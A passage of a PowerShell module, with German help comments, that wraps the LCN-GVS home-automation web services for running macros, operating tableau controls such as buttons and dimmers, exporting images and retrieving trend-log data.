        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", ($Script:LocalizedData.InvokeLCNGVSMacro -f $macroName)))
        {   
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MacroServer1Svc.ExecuteMacro($macroName)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Fuehrt das angegebene Makro aus.  
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros ausfuehren.  
    .PARAMETER macroName
        Legt das auszufuehrende Makro fest.
    .EXAMPLE
        Invoke-LCNGVSMacroAsync -macroName "Garagentor oeffnen"
    .LINK
        Invoke-LCNGVSMacro
        Get-LCNGVSMacroServerEnabled
        Set-LCNGVSMacroServerEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
#>
function Invoke-LCNGVSMacroAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSMacroAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $macroName
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", ($Script:LocalizedData.InvokeLCNGVSMacro -f $macroName)))
        {   
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:MacroServer1Svc.ExecuteMacroAsync($macroName)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

#endregion

# -----------------------------------------------
# Webservice: Tableau - Tableaus, Steuerelemente und TrendLogs
# -----------------------------------------------
#region WebService: Tableau

<#
    .SYNOPSIS
        Ruft die Tableaugruppen ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Tableaugruppen abrufen.
    .EXAMPLE
        Get-LCNGVSTableauGroupInfo
    .LINK
        Open-LCNGVSTableau        
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSTableauGroupInfo # Alias: Get-Tableaus
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableauGroupInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSTableauList','Get-Tableaus')]
    [OutputType([LCNGVS.Tableau.TableauGroupInfo[]])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Name')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauGroupName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {      
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTableauGroupInfo))
        {   
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $TableauGroupInfoList = $Script:Tableau1Svc.GetTableaus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        $TableauGroupInfoList | Where-Object -Property name -Like -Value $tableauGroupName
                    }
                    else
                    {
                        $TableauGroupInfoList
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {        
    }
}

<#
    .SYNOPSIS
        Oeffnet eine neue TableauSession.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie eine Sitzung fuer ein im LCN-GVS eingerichteten Tableau oeffnen.
    .EXAMPLE
        Open-LCNGVSTableau
    .LINK
        Get-LCNGVSTableauGroupInfo        
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Open-LCNGVSTableau # Alias: Open-Tableau
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableau',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSTableau','Open-Tableau')]
    [OutputType([LCNGVS.Tableau.Tableau])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauGroupName,

        # Hilfebeschreibung zu Param2
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauId,

        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Uri')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $TableauUri,

        [Parameter(Mandatory=$false, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Uri')]
        [Parameter(Mandatory=$false, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false, 
                   Position=2,
                   ParameterSetName='Default')]
        [Switch] $SetAsLastTableau
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }

        if ($pscmdlet.ParameterSetName -eq 'Uri')
        { 
            [String[]] $string = $TableauUri.Split('\')
            $tableauGroupName = $string[0]
            $tableauId = $string[1]
        }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.OpenLCNGVSTableau))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Tableau = $Script:Tableau1Svc.OpenTableau($tableauGroupName, $tableauId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Tableau
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        if ($SetAsLastTableau) {Set-LCNGVSLastTableauUri -Tableau $Tableau | Out-Null}
    }
}

<#
    .SYNOPSIS
        Schliesst die angegebene TableauSession.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie eine geoeffnete Sitzung schliessen.
    .EXAMPLE
        Close-LCNGVSTableau
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau        
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Close-LCNGVSTableau # Alias: Close-Tableau
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableau',
                  ConfirmImpact='Medium')]
    [Alias('Close-Tableau')]
    [OutputType([bool])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [int] $tableauSessionId
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.CloseLCNGVSTableau))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:Tableau1Svc.CloseTableau($tableauSessionId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft die angegebenen Images ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die im LCN-GVS hinterlegten Bilder abrufen.
    .EXAMPLE
        Get-LCNGVSImage
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau        
        Close-LCNGVSTableau
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSImage # Alias: Get-Image
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSImage',
                  ConfirmImpact='Medium')]
    [Alias('Get-Image')]
    [OutputType([LCNGVS.Tableau.Image[]])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String[]] $imageName
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetImages))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Image = $Script:Tableau1Svc.GetImages($imageName)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Image
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Exportiert das angebene Bild.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie ein Bild auf einem Datentraeger speichern.
    .EXAMPLE
        Export-LCNGVSImage
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau        
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Export-LCNGVSImage # Alias: Save-Image
{

    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$true,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Export-LCNGVSImage',
                  ConfirmImpact='Medium')]
    [Alias('Save-Image')]
    [OutputType()]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$true,
                   Position=0,
                   ParameterSetName='Default')]
        [string] $Path, # '.\Unknown.png'
        
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$true,
                   Position=1,
                   ParameterSetName='Default')]
        [string] $DataBase64,

        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$true,
                   Position=0,
                   ParameterSetName='Image')]
        [LCNGVS.Tableau.Image] $Image
    )

    Begin
    {
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.ExportImage))
        {
            if ($PSCmdlet.ParameterSetName -eq 'Image')
            {
                $path = $Image.name.Split('/')[($Image.name.Split('/').Count -1)]
                $path = '.\' + $path

                $DataBase64 = $Image.DataBase64
            }

            $bytes = [Convert]::FromBase64String($DataBase64)
            [IO.File]::WriteAllBytes($path, $bytes)
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft das angegebene Steuerelement ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Steuerelemente eines Tableaus abrufen.
    .EXAMPLE
        Get-LCNGVSControl -TableauUri "Haus\Wohnzimmer" -Id 33
    .EXAMPLE
        Get-LCNGVSControl -TableauGroupName "Haus" -TableauId "Wohnzimmer" -Id 33
    .EXAMPLE
        Get-LCNGVSControl -TableauUri "Haus\Wohnzimmer" -ControlType Button 
    .EXAMPLE
        Get-LCNGVSControl -TableauGroupName "Haus" -TableauId "Wohnzimmer" -ControlType Button
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau        
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSControl # Alias: Get-Control, Get-TableauControl, Get-LCNGVSTableauControl
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableauControl',
                  ConfirmImpact='Medium')]
    [Alias('Get-Control','Get-TableauControl','Get-LCNGVSTableauControl')]
    [OutputType([LCNGVS.Tableau.Control])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauGroupName,

        # Hilfebeschreibung zu Param2
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Default')]
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Id')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauId,

        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Uri')]
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Id2')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $TableauUri,

        [Parameter(Mandatory=$false, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=2,
                   ParameterSetName='Default')]
        [Parameter(Mandatory=$false, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Uri')]
        [LCNGVS.Tableau.ControlType] $ControlType = [LCNGVS.Tableau.ControlType]::Unknown,

        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=2,
                   ParameterSetName='Id')]
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Id2')]
        [String] $Id

    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }

        if ($pscmdlet.ParameterSetName -eq 'Uri' -or $pscmdlet.ParameterSetName -eq 'Id2')
        { 
            [String[]] $string = $TableauUri.Split('\')
            $tableauGroupName = $string[0]
            $tableauId = $string[1]
        }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTableauControl))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Tableau = $Script:Tableau1Svc.OpenTableau($tableauGroupName, $tableauId)
                    if ($pscmdlet.ParameterSetName -eq "Default" -or $pscmdlet.ParameterSetName -eq "Uri")
                    {
                        $Controls = $Tableau.Controls | Where-Object -Property type -EQ -Value $ControlType
                    }
                    if ($pscmdlet.ParameterSetName -eq "Id" -or $pscmdlet.ParameterSetName -eq "Id2")
                    {
                        $Controls = $Tableau.Controls | Where-Object -Property id -EQ -Value $Id
                    }
                    $Script:Tableau1Svc.CloseTableau($Tableau.tableauSessionId) | Out-Null
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Controls
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Fragt einen neuen Status der angegebenen Steuerelemente.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie einen neuen Status der angegebenen Steuerelemente erfragen.
    .EXAMPLE
        Get-LCNGVSControlUpdateList
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau        
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSControlUpdateList # Alias: Poll-Updates
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSControlUpdates',
                  ConfirmImpact='Medium')]
    [Alias('Poll-Updates')]
    [OutputType([LCNGVS.Tableau.Control[]])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [int] $tableauSessionId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int[]] $updatedControls,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String[]] $updatedControlStringIds
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.PollUpdates))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Control = $Script:Tableau1Svc.PollUpdates($tableauSessionId,$updatedControls,$updatedControlStringIds)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Control
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Betaetigt die angegebene Schaltflaeche.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie eine Schaltflaeche auf einem im LCN-GVS eingerichteten Tableau betaetigen.
    .EXAMPLE
        Invoke-LCNGVSButton
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau        
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Invoke-LCNGVSButton # Alias: Submit-Button
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSButton',
                  ConfirmImpact='Medium')]
    [Alias('Submit-Button')]
    [OutputType([LCNGVS.Tableau.SubmitResult])]
    Param
    (
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Standard')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [int] $tableauSessionId,

        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Standard')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $controllId
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.InvokeLCNGVSButton))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $SubmitResult = $Script:Tableau1Svc.SubmitButton($tableauSessionId, $controllId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $SubmitResult
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Stellt den Dimmer auf dem Tableau ein.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie einen Dimmer auf einem im LCN-GVS eingerichteten Tableau einstellen.
    .EXAMPLE
        Invoke-LCNGVSDimmer
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau        
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
#>
function Invoke-LCNGVSDimmer # Alias: Submit-Dimmer
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSDimmer',
                  ConfirmImpact='Medium')]
    [Alias('Submit-Dimmer')]
    [OutputType([LCNGVS.Tableau.SubmitResult])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [int] $tableauSessionId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $controllId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $positionInPercent
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.InvokeLCNGVSDimmer))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $SubmitResult = $Script:Tableau1Svc.SubmitDimmer($tableauSessionId, $controllId, $positionInPercent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $SubmitResult
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

# -----------------------------------------------
# TrendLogs
# -----------------------------------------------

function Get-LCNGVSSupportedTrendLogSources
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSSupportedTrendLogSources',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Tableau.TrendLogSource[]])]
    Param
    (
        [Parameter(Mandatory=$true,
                ValueFromPipelineByPropertyName=$true,
                Position=0)]
        [int] $busId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int] $segId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $modId
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {        
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSSupportedTrendLogSources))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $TrendLogSources = $Script:Tableau1Svc.GetSupportedTrendLogSources($busId,$segId,$modId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLogSources
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

function Get-LCNGVSTrendLogs
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTrendLogs',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.Tableau.TrendLogItem[]])]
    Param
    (
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $TrendLogItem = $Script:Tableau1Svc.GetTrendLogs()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $TrendLogItem
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

# Der Export erfolgt im CSV-Format nach RFC 4180. Die Kodierung ist UTF-8, das Trennzeichen ist "Komma". Der MIME-Typ des Datei-Downloads ist "text/csv".
function Export-LCNGVSTrendLog
{
    [CmdletBinding(DefaultParameterSetName='Standard', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Export-LCNGVSTrendLog',
                  ConfirmImpact='Medium')]
    [Alias()]
    Param
    (
        [Parameter(Mandatory=$true,
                ValueFromPipelineByPropertyName=$true,
                Position=0)]
        [int] $busId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int] $segId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=2)]
        [int] $modId,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=3)]
        [String] $source,

        [Parameter(Mandatory=$false,
                   ValueFromPipelineByPropertyName=$true,
                   Position=4)]
        [DateTime] $StartDate = ([DateTime]::Now).AddDays(-30),

        [Parameter(Mandatory=$false,
                   ValueFromPipelineByPropertyName=$true,
                   Position=5)]
        [DateTime] $EndDate = [DateTime]::Now
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.ExportLCNGVSTrendLog))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    [Uri] $url = $Script:authSvc.Url
                    $BasisUrl = $url.Scheme + "://" + $url.Host + $url.Segments[0] + $url.Segments[1]
                    $BasisUrl = $BasisUrl + "TrendLogExport.aspx?busId=$($busId)&segId=$($segId)&modId=$($modId)&source=$($source)&start=$($StartDate.Year)-$($StartDate.Month.ToString('00'))-$($StartDate.Day.ToString('00'))&end=$($EndDate.Year)-$($EndDate.Month.ToString('00'))-$($EndDate.Day.ToString('00'))"
                    $webrequest = [System.Net.HTTPWebRequest]::Create($BasisUrl);
                    $webrequest.CookieContainer = $Script:authSvc.CookieContainer
                    $webrequest.Method = [Microsoft.PowerShell.Commands.WebRequestMethod]::Get
                    $response = $webrequest.GetResponse()
                    $responseStream = $response.GetResponseStream()
                    $streamReader = New-Object System.IO.Streamreader($responseStream)
                    $output = $streamReader.ReadToEnd()
                    return $output
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

function Open-LCNGVSTrendLog
{
